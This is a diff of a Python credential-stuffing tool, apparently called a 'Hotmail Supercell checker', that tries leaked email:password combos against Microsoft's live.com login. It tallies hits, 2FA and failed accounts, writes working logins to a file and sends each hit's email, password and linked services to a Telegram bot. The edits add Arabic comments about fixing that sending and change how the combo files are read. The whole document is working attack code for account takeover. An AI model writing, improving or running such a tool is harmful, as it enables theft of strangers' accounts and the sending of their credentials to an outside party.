@@ -1,4 +1,3 @@
-cat << 'EOF' > checker.py
 import requests,json,random,threading,time,os,sys,re,urllib.parse,telebot
 from concurrent.futures import ThreadPoolExecutor,as_completed
 from datetime import datetime
@@ -95,7 +94,7 @@ class HotmailSupercellChecker:
   self.session.verify=False
  def load_combo(self,combo_file):
   if not os.path.exists(combo_file):
-   print(f"{Z}[Combo file not found]{M}")
+   print(f"{Z}[Combo file not{M}")
    return[]
   combos=[]
   with open(combo_file,'r',encoding='utf-8',errors='ignore')as f:
@@ -110,17 +109,10 @@ class HotmailSupercellChecker:
    for sv in links:
     lk+=f"• {sv}\n"
    ms=f"🔥 𝗛𝗜𝗧 𝗛𝗢𝗧𝗠𝗔𝗜𝗟\n\n📧 Email: {username}\n🔑 Password: {password}\n\n🔗 Services Found:\n{lk}\n\nBy: @WARIOR_PY"
+‎   # ✅ إصلاح مشكلة إرسال الرسالة
    TB.send_message(CI, ms)
   except Exception as e:
    print(f"{Z}[Telegram Error] {e}{M}")
-
- def get_next_hot_filename(self):
-  i = 0
-  while True:
-   name = "hot.txt" if i == 0 else f"hot{i}.txt"
-   if not os.path.exists(name): return name
-   i += 1
-
  def check_account(self,username,password):
   try:
    login_url="https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"
@@ -225,6 +217,7 @@ class HotmailSupercellChecker:
       with self.lock:
        self.hits+=1
       self.save_result(username,password,"HIT",None,"HIT")
+‎      # ✅ استدعاء دالة إرسال التلغرام للصيد
       self.send_telegram(username,password,found_links)
       return"HIT"
      else:
@@ -246,18 +239,18 @@ class HotmailSupercellChecker:
    return"RETRY"
  def save_result(self,username,password,info,proxy=None,hit_type="FREE"):
   if hit_type=="HIT":
-   filename = self.get_next_hot_filename()
-   with open(filename,"a",encoding="utf-8")as f:
+   with open("hits.txt","a",encoding="utf-8")as f:
     f.write(f"{username}:{password}\n")
  def print_stats(self,running=True):
   if running:
-   sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M}")
+   sys.stdout.write(f"\r     {S}{M}Hits:{F}{self.hits:,}{M} | 2FA:{C}{self.twofactor:,}{M} | Custom:{X}{self.custom:,}{M} | Bad:{Z}{self.bad:,}{M} | Retries:{A}{self.retries:,}{S}{M}\n")
    sys.stdout.flush()
   else:
-   print("\nDone.")
+   exit()
  def run_checker(self,combo_file):
   combos=self.load_combo(combo_file)
   if not combos:
+   print(f"{Z}No combos{M}")
    return
   self.total=len(combos)
   start_time=time.time()
@@ -282,18 +275,16 @@ class HotmailSupercellChecker:
   self.print_stats(running=False)
 def main():
  checker=HotmailSupercellChecker()
- files_input = input(f"{X}Enter combo files (e.g., hot1.txt hot2.txt): {M}").strip()
- files = files_input.split()
+ files = [f"hot{i}.txt" for i in range(1, 7)]
  os.system('clear')
- for file in files:
-  print(f"{F}Checking: {file}{M}")
-  try:
-   checker.run_checker(file)
-  except KeyboardInterrupt:
-   break
-  except Exception as e:
-   pass 
+ try:
+  for file in files:
+    if os.path.exists(file):
+        checker.run_checker(file)
+ except KeyboardInterrupt:
+  pass
+ except Exception as e:
+  pass 
+  #print(ed)
 if __name__=="__main__":
  main()
-EOF
-python3 checker.py
